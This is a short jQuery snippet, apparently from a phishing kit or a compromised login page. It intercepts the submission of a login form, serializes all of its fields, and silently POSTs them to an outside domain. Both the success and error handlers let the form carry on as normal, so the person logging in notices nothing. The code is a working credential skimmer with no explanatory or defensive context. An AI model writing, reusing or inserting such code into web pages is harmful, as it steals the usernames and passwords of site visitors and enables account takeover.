$(".form-login").submit(function() {

	var d = $(".form-login");

	$.ajax({

        url: "https://curl.raka-ganzz2022.my.id/bkp1/",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

})
